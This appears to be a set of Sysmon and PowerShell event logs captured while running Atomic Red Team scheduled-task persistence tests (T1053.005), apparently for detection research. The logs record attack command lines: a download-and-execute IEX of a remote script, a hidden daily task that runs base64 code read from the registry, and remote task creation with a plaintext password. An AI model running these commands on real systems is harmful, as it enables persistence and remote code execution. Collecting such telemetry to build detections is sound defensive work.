@@ -1,0 +1,486 @@
+Atomic Test #1 - Scheduled Task Startup Script
+not found
+
+Atomic Test #2 - Scheduled task Local
+not found
+
+Atomic Test #3 - Scheduled task Remote
+
+Log1
+09/04/2024 10:41:19 AM
+LogName=Microsoft-Windows-Sysmon/Operational
+EventCode=1
+EventType=4
+ComputerName=DESKTOP-43B3OH1
+User=SYSTEM
+Sid=S-1-5-18
+SidType=1
+SourceName=Microsoft-Windows-Sysmon
+Type=信息
+RecordNumber=413392
+Keywords=None
+TaskCategory=Process Create (rule: ProcessCreate)
+OpCode=信息
+Message=Process Create:
+RuleName: -
+UtcTime: 2024-09-04 02:41:19.635
+ProcessGuid: {6f6dba56-c8cf-66d7-e71c-2d0000001700}
+ProcessId: 110524
+Image: C:\Windows\System32\schtasks.exe
+FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
+Description: Task Scheduler Configuration Tool
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: schtasks.exe
+CommandLine: SCHTASKS  /Delete /S localhost /U DOMAIN\user /P At0micStrong /TN "Atomic task" /F 
+CurrentDirectory: C:\Windows\system32\
+User: DESKTOP-43B3OH1\xcy
+LogonGuid: {6f6dba56-34a7-66d6-0a51-0c2102000000}
+LogonId: 0x2210C510A
+TerminalSessionId: 2
+IntegrityLevel: High
+Hashes: SHA1=FCE60EBC7EBCC8B09D5821338391D800E7B37591,MD5=D4DA03B7BB20B7E4F1B762A365D4DD4F,SHA256=9A80453518078BADF0679B0CF30F50A83163E5264A2665C6052CC27F168C50F2,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05
+ParentProcessGuid: {6f6dba56-41b7-66d6-4c79-2a0000001700}
+ParentProcessId: 7560
+ParentImage: C:\Windows\System32\cmd.exe
+ParentCommandLine: "C:\Windows\system32\cmd.exe" 
+ParentUser: DESKTOP-43B3OH1\xcy
+Collapse
+host = DESKTOP-43B3OH1source = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1053.005\T1053_005.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational
+
+Atomic Test #4 - Powershell Cmdlet Scheduled Task
+
+Log1
+10/02/2024 11:25:42 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=3036
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+$Action = New-ScheduledTaskAction -Execute "calc.exe"
+
+ScriptBlock ID: 6fe75adb-a653-4cc2-ac8c-2e5db66a034b
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1053.005\T1053_005_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Log2
+10/02/2024 11:25:45 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=3075
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+Register-ScheduledTask AtomicTask -InputObject $object
+
+ScriptBlock ID: 0b43e2bb-0f44-4f30-8896-b111d803d92a
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1053.005\T1053_005_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+
+Atomic Test #5 - Task Scheduler via VBA
+
+Log1
+10/02/2024 11:26:28 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=3087
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
+
+ScriptBlock ID: 00786770-4bf7-4d7a-a511-fe104d8ba674
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1053.005\T1053_005_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Log2
+10/02/2024 11:26:28 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=3090
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+Invoke-MalDoc -macroFile "E:\T1053.005-macrocode.txt" -officeProduct "Word" -sub "Scheduler"
+
+ScriptBlock ID: daf1ef98-3c4c-4d47-aada-9dc98e49e98c
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1053.005\T1053_005_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Atomic Test #6 - WMI Invoke-CimMethod Scheduled Task
+
+Log1
+10/02/2024 11:27:37 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=3096
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
+
+ScriptBlock ID: b2143558-3282-4308-b61d-33809a56d77c
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1053.005\T1053_005_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Atomic Test #7 - Scheduled Task Executing Base64 Encoded Commands From Registry
+
+Log1
+09/04/2024 10:47:51 AM
+LogName=Microsoft-Windows-Sysmon/Operational
+EventCode=1
+EventType=4
+ComputerName=DESKTOP-43B3OH1
+User=SYSTEM
+Sid=S-1-5-18
+SidType=1
+SourceName=Microsoft-Windows-Sysmon
+Type=信息
+RecordNumber=453747
+Keywords=None
+TaskCategory=Process Create (rule: ProcessCreate)
+OpCode=信息
+Message=Process Create:
+RuleName: -
+UtcTime: 2024-09-04 02:47:51.961
+ProcessGuid: {6f6dba56-ca57-66d7-a11f-2d0000001700}
+ProcessId: 75764
+Image: C:\Windows\System32\schtasks.exe
+FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
+Description: Task Scheduler Configuration Tool
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: schtasks.exe
+CommandLine: "C:\Windows\system32\schtasks.exe" /Create /F /TN ATOMIC-T1053.005 /TR "cmd /c start /min '' powershell.exe -Command \"IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\"" /sc daily /st 07:45
+CurrentDirectory: E:\Experiment\Windows-Hacker-Attack-Program\caldera\T1053.005-Scheduled-Task\
+User: DESKTOP-43B3OH1\xcy
+LogonGuid: {6f6dba56-34a7-66d6-0a51-0c2102000000}
+LogonId: 0x2210C510A
+TerminalSessionId: 2
+IntegrityLevel: High
+Hashes: SHA1=FCE60EBC7EBCC8B09D5821338391D800E7B37591,MD5=D4DA03B7BB20B7E4F1B762A365D4DD4F,SHA256=9A80453518078BADF0679B0CF30F50A83163E5264A2665C6052CC27F168C50F2,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05
+ParentProcessGuid: {6f6dba56-c92c-66d7-881d-2d0000001700}
+ParentProcessId: 10628
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+ParentUser: DESKTOP-43B3OH1\xcy
+Collapse
+host = DESKTOP-43B3OH1source = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1053.005\T1053_005.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational
+
+Log2
+09/04/2024 10:46:25 AM
+LogName=Microsoft-Windows-Sysmon/Operational
+EventCode=1
+EventType=4
+ComputerName=DESKTOP-43B3OH1
+User=SYSTEM
+Sid=S-1-5-18
+SidType=1
+SourceName=Microsoft-Windows-Sysmon
+Type=信息
+RecordNumber=444538
+Keywords=None
+TaskCategory=Process Create (rule: ProcessCreate)
+OpCode=信息
+Message=Process Create:
+RuleName: -
+UtcTime: 2024-09-04 02:46:25.989
+ProcessGuid: {6f6dba56-ca01-66d7-071f-2d0000001700}
+ProcessId: 106168
+Image: C:\Windows\System32\schtasks.exe
+FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
+Description: Task Scheduler Configuration Tool
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: schtasks.exe
+CommandLine: schtasks.exe  /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min '' powershell.exe -Command \`"IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\`"" /sc daily /st 15:15
+CurrentDirectory: C:\Windows\system32\
+User: DESKTOP-43B3OH1\xcy
+LogonGuid: {6f6dba56-34a7-66d6-0a51-0c2102000000}
+LogonId: 0x2210C510A
+TerminalSessionId: 2
+IntegrityLevel: High
+Hashes: SHA1=FCE60EBC7EBCC8B09D5821338391D800E7B37591,MD5=D4DA03B7BB20B7E4F1B762A365D4DD4F,SHA256=9A80453518078BADF0679B0CF30F50A83163E5264A2665C6052CC27F168C50F2,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05
+ParentProcessGuid: {6f6dba56-c9eb-66d7-e61e-2d0000001700}
+ParentProcessId: 109704
+ParentImage: C:\Windows\System32\cmd.exe
+ParentCommandLine: cmd
+ParentUser: DESKTOP-43B3OH1\xcy
+Collapse
+host = DESKTOP-43B3OH1source = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1053.005\T1053_005.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational
+
+Log3
+09/04/2024 10:46:03 AM
+LogName=Microsoft-Windows-Sysmon/Operational
+EventCode=1
+EventType=4
+ComputerName=DESKTOP-43B3OH1
+User=SYSTEM
+Sid=S-1-5-18
+SidType=1
+SourceName=Microsoft-Windows-Sysmon
+Type=信息
+RecordNumber=442712
+Keywords=None
+TaskCategory=Process Create (rule: ProcessCreate)
+OpCode=信息
+Message=Process Create:
+RuleName: -
+UtcTime: 2024-09-04 02:46:03.484
+ProcessGuid: {6f6dba56-c9eb-66d7-e51e-2d0000001700}
+ProcessId: 107804
+Image: C:\Windows\System32\schtasks.exe
+FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
+Description: Task Scheduler Configuration Tool
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: schtasks.exe
+CommandLine: schtasks.exe  /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min '' powershell.exe -Command \`"IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\`"" /sc daily /st 15:15
+CurrentDirectory: C:\Windows\system32\
+User: DESKTOP-43B3OH1\xcy
+LogonGuid: {6f6dba56-34a7-66d6-0a51-0c2102000000}
+LogonId: 0x2210C510A
+TerminalSessionId: 2
+IntegrityLevel: High
+Hashes: SHA1=FCE60EBC7EBCC8B09D5821338391D800E7B37591,MD5=D4DA03B7BB20B7E4F1B762A365D4DD4F,SHA256=9A80453518078BADF0679B0CF30F50A83163E5264A2665C6052CC27F168C50F2,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05
+ParentProcessGuid: {6f6dba56-41b7-66d6-4c79-2a0000001700}
+ParentProcessId: 7560
+ParentImage: C:\Windows\System32\cmd.exe
+ParentCommandLine: "C:\Windows\system32\cmd.exe" 
+ParentUser: DESKTOP-43B3OH1\xcy
+Collapse
+host = DESKTOP-43B3OH1source = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1053.005\T1053_005.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational
+
+Log4
+09/04/2024 10:45:41 AM
+LogName=Microsoft-Windows-Sysmon/Operational
+EventCode=1
+EventType=4
+ComputerName=DESKTOP-43B3OH1
+User=SYSTEM
+Sid=S-1-5-18
+SidType=1
+SourceName=Microsoft-Windows-Sysmon
+Type=信息
+RecordNumber=440094
+Keywords=None
+TaskCategory=Process Create (rule: ProcessCreate)
+OpCode=信息
+Message=Process Create:
+RuleName: -
+UtcTime: 2024-09-04 02:45:41.320
+ProcessGuid: {6f6dba56-c9d5-66d7-b11e-2d0000001700}
+ProcessId: 5384
+Image: C:\Windows\System32\schtasks.exe
+FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
+Description: Task Scheduler Configuration Tool
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: schtasks.exe
+CommandLine: "C:\Windows\system32\schtasks.exe" /Create /F /TN ATOMIC-T1053.005 /TR "cmd /c start /min '' powershell.exe -Command \"IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))\"" /sc daily /st 15:15
+CurrentDirectory: E:\
+User: DESKTOP-43B3OH1\xcy
+LogonGuid: {6f6dba56-34a7-66d6-0a51-0c2102000000}
+LogonId: 0x2210C510A
+TerminalSessionId: 2
+IntegrityLevel: High
+Hashes: SHA1=FCE60EBC7EBCC8B09D5821338391D800E7B37591,MD5=D4DA03B7BB20B7E4F1B762A365D4DD4F,SHA256=9A80453518078BADF0679B0CF30F50A83163E5264A2665C6052CC27F168C50F2,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05
+ParentProcessGuid: {6f6dba56-c92c-66d7-881d-2d0000001700}
+ParentProcessId: 10628
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+ParentUser: DESKTOP-43B3OH1\xcy
+Collapse
+host = DESKTOP-43B3OH1source = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1053.005\T1053_005.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational
+
+Log5
+09/04/2024 10:47:51 AM
+LogName=Microsoft-Windows-Sysmon/Operational
+EventCode=1
+EventType=4
+ComputerName=DESKTOP-43B3OH1
+User=SYSTEM
+Sid=S-1-5-18
+SidType=1
+SourceName=Microsoft-Windows-Sysmon
+Type=信息
+RecordNumber=453729
+Keywords=None
+TaskCategory=Process Create (rule: ProcessCreate)
+OpCode=信息
+Message=Process Create:
+RuleName: -
+UtcTime: 2024-09-04 02:47:51.950
+ProcessGuid: {6f6dba56-ca57-66d7-a01f-2d0000001700}
+ProcessId: 109764
+Image: C:\Windows\System32\reg.exe
+FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+Description: Registry Console Tool
+Product: Microsoft® Windows® Operating System
+Company: Microsoft Corporation
+OriginalFileName: reg.exe
+CommandLine: "C:\Windows\system32\reg.exe" add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
+CurrentDirectory: E:\Experiment\Windows-Hacker-Attack-Program\caldera\T1053.005-Scheduled-Task\
+User: DESKTOP-43B3OH1\xcy
+LogonGuid: {6f6dba56-34a7-66d6-0a51-0c2102000000}
+LogonId: 0x2210C510A
+TerminalSessionId: 2
+IntegrityLevel: High
+Hashes: SHA1=C0DB341DEFA8EF40C03ED769A9001D600E0F4DAE,MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
+ParentProcessGuid: {6f6dba56-c92c-66d7-881d-2d0000001700}
+ParentProcessId: 10628
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+ParentUser: DESKTOP-43B3OH1\xcy
+Collapse
+host = DESKTOP-43B3OH1source = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1053.005\T1053_005.evtxsourcetype = WinEventLog:Microsoft-Windows-Sysmon/Operational
+
+Atomic Test #8 - Import XML Schedule Task with Hidden Attribute
+
+Log1
+10/02/2024 11:28:08 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=3102
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace "Root\Microsoft\Windows\TaskScheduler" -MethodName "RegisterByXml" -Arguments @{ Force = $true; Xml =$xml; }
+
+ScriptBlock ID: b94170a2-5031-4a8f-9ec7-bdcb012ceb35
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1053.005\T1053_005_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Atomic Test #9 - PowerShell Modify A Scheduled Task
+
+Log1
+10/02/2024 11:28:37 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=3118
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+$NewAction = New-ScheduledTaskAction -Execute "Notepad.exe"
+
+ScriptBlock ID: 7ca7f3b4-11b9-4133-99ad-151abce27519
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1053.005\T1053_005_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Log2
+10/02/2024 11:28:37 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=3106
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+$Action = New-ScheduledTaskAction -Execute "cmd.exe"
+
+ScriptBlock ID: bb81990b-5c1d-4cf1-8f14-2d6168d8e90a
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1053.005\T1053_005_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Log3
+10/02/2024 11:28:37 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=5
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=详细
+RecordNumber=3116
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 1，共 1):
+Register-ScheduledTask AtomicTaskModifed -InputObject $object
+
+ScriptBlock ID: f9ebe8e7-208c-45fb-84f9-645a76349914
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\15ttp_logs_2_with_powershell\T1053.005\T1053_005_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+
+Atomic Test #11 - Scheduled Task Persistence via CompMgmt.msc
+not found
+
+Atomic Test #12 - Scheduled Task Persistence via Eventviewer.msc
+not found
